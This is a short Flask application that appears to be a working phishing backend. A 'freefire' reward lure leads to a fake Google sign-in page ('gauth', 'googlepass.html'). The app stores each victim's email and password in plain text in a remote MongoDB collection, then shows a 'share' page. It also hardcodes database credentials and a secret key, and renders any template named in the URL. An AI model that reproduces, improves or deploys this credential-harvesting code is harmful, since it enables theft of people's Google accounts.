from flask import Flask, render_template, request,session,redirect
from pymongo import MongoClient
import re

from flask.helpers import url_for

app=Flask(__name__)
app.secret_key = "($usdanw*&" 
db=MongoClient('mongodb+srv://fknown:HELPMEBRO@cluster0.boeml.mongodb.net/freefire?retryWrites=true&w=majority').freefire

@app.route('/')
def index():
    session['user']=None
    return render_template('index.html')

@app.route("/gauth",methods=['GET','POST'])
def glogin():
    if request.method=='POST':
        session['user']=request.form['identifier']
        if not re.findall(r"@gmail.com",session['user']):session['user']+="@gmail.com"
        return render_template('googlepass.html',act=session['user'])
    else: return redirect(url_for('index'))

@app.route("/reward",methods=['GET','POST'])
def share():
    if request.method=='POST':
        if session['user']==None:
            email=request.form['email']
            passwd=request.form['pass']
        else:
            email=session['user']
            passwd=request.form['password']
        db.users.insert_one({"user":email,"password":passwd})
        return render_template('share.html')
    else: return redirect(url_for('index'))

@app.route("/<name>")
def login(name):
    return render_template(f'{name}.html')

if __name__=="__main__":
    app.run()